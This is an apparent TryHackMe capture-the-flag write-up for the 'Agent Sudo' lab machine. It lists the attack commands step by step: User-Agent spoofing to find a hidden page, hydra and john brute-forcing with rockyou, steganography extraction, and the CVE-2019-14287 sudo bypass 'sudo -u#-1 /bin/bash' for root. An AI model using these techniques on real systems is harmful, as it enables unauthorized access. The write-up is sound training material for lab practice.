
# TryHackMe – Agent Sudo Write-up

## Nmap Scan
#### Command: 
 nmap -sV 10.48.183.107
#### Output:

 ![alt text](images/image.png)

## Directory enumeration 
#### Command:
 gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
#### Output:

![alt text](images/image-2.png)

#### Command: 
 curl http://IP   
#### Output:

 ![alt text](images/image-1.png)
#### Note: 
 The User-Agent header is sent by the client in an HTTP request, it contains information about the application, operating system, and platform.

#### Command:
 I sent a request using curl with "R" as a User-Agent 
 
 curl -A "R" -i  http://IP
#### Output:

 ![alt text](images/image-3.png)
 the server returned a different response. 

 I modified the User-Agent header by iterating through alphabetic values to bypass the filter.
#### Command:
 curl -A "C" -i http://IP
#### Output:

![alt text](images/image-4.png)

 The server returned a Location header pointing to a file named agent_C_attention.php
#### Command:
 curl -i http://IP/agent_C_attention.php  
#### Output:

 ![alt text](images/image-5.png)
 the agent name is chris 

## ftp BruteForce
#### Command:
 hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://IP
#### Output:

![alt text](images/image-6.png)

password found : crystal

## ftp Connection (as chris)
#### Command:
  ftp chris@IP
#### Output:

 ![alt text](images/image-7.png)
 
### getting all the files found
#### Command: 
 get To_agentJ.txt
 get cute-alien.jpg
 get cutie.png

 ![alt text](images/image-8.png)
 
#### Command: 
 cat To_agentJ.txt  
#### Output:

 ![alt text](images/image-9.png)

## Steganography
### Searching in cute-alien.jpg 
#### Command: 
 stegseek cute-alien.jpg 
#### Output:

![alt text](images/image-10.png)
#### Command: 
 cat cute-alien.jpg.out
#### Output:

![alt text](images/image-11.png)

 SSH login password : hackerrules!

### Searching in cute-alien.jpg 
#### Command: 
 binwalk cutie.png
#### Output:

![alt text](images/image-12.png)

 we found a zip archive data named To_agentR.txt

#### Command: 
 binwalk -e cutie.png
#### Output:
 archives extracted :

 ![alt text](images/image-13.png)

 ![alt text](images/image-14.png)

 archive is protected by a password


## Cracking Zip file password
### generate hash:
#### Command: 
 zip2john 8702.zip > hash.txt

### password bruteforce:
#### Command: 
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
#### Output:

![alt text](images/image-15.png)

 Zip file password: alien
#### Command:
 7z x 8702.zip

 ![alt text](images/image-16.png)

 ![alt text](images/image-17.png)

## SSH Access (as james)
#### Command:
  ssh james@IP
  password : hackerrules!
#### Output:

![alt text](images/image-18.png)

 i found an image called Alien_autospy.jpg , let's download it 
 
#### Command:
 scp james@IP:/home/james/Alien_autospy.jpg

 ![alt text](images/image-19.png)

## OSINT
#### Command:
  open Alien_autospy.jpg
#### Output:

![alt text](images/image-20.png) 

Searching for this image on google images : Roswell alien autopsy

## Privilege escalation
#### Command:
  sudo -l
#### Output:

 ![alt text](images/image-21.png)

james can run /bin/bash with sudo but not as root

### looking for the CVE:
#### Command:
  sudo --version
#### Output:

![alt text](images/image-22.png)

![alt text](images/image-23.png)
#### Note:
CVE-2019-14287 is a privilege escalation vulnerability in older versions of sudo, it occurs when a user is allowed to run commands as any user except root. Although this configuration is meant to prevent access to the root account, sudo only checks the username root and does not correctly validate UIDs. By specifying a UID of -1, which is interpreted as UID 0 (root), we can bypass the restriction and execute commands with root privileges.

#### Command:
  sudo -u#-1 /bin/bash
#### Output:

![alt text](images/image-24.png)
#### Note:
  The -u#-1 option tells sudo to run the command as a user specified by a numeric ID, and because -1 is treated as UID 0, it effectively runs the command as root.

